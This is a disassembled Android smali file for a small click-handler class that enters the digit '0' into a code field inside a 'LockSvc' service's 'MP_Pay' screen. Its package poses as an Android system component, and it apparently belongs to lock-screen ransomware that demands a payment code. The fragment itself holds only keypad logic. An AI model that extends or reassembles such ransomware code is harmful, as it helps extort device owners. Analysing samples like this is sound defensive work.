.class Lcom/android/system/LockSvc$15;
.super Ljava/lang/Object;
.source "LockSvc.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/system/LockSvc;->MP_Pay(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/LockSvc;


# direct methods
.method constructor <init>(Lcom/android/system/LockSvc;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/system/LockSvc$15;->this$0:Lcom/android/system/LockSvc;

    .line 558
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3
    .param p1, "arg0"    # Landroid/view/View;

    .prologue
    .line 561
    iget-object v0, p0, Lcom/android/system/LockSvc$15;->this$0:Lcom/android/system/LockSvc;

    const-string v1, "0"

    iget-object v2, p0, Lcom/android/system/LockSvc$15;->this$0:Lcom/android/system/LockSvc;

    iget-object v2, v2, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    invoke-virtual {v0, v1, v2}, Lcom/android/system/LockSvc;->InsertCode(Ljava/lang/String;Landroid/view/View;)V

    .line 562
    return-void
.end method
